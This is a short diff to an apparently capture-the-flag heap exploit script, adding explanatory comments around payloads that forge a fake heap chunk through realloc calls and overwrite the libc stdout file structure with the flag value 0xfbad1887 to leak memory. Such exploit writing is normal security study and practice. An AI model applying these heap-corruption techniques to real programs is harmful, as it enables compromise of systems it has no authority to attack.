@@ -45,7 +45,7 @@ def pwn():
     # Fake chunk.
     payload = p64(0x0) * 7 + p64(0x51) + p8(0x60) + p8(io_offset)
     realloc(0x50, payload)
-    # Then we free it.
+    # Then we free it. Since size is corrupted, it won't go back to the previous list.
     realloc(0x0, '')
 
     # ptr => 0x30. Now we lack 0x50.
@@ -54,6 +54,7 @@ def pwn():
     # Modified from main_arena to io_2_1.
     realloc(0x0, '')
 
+    # This time, we can manipulate io_stdout.
     payload = p64(0xfbad1887) + p64(0x0) * 3 + p8(0x58)
     realloc(0x80, payload)
 
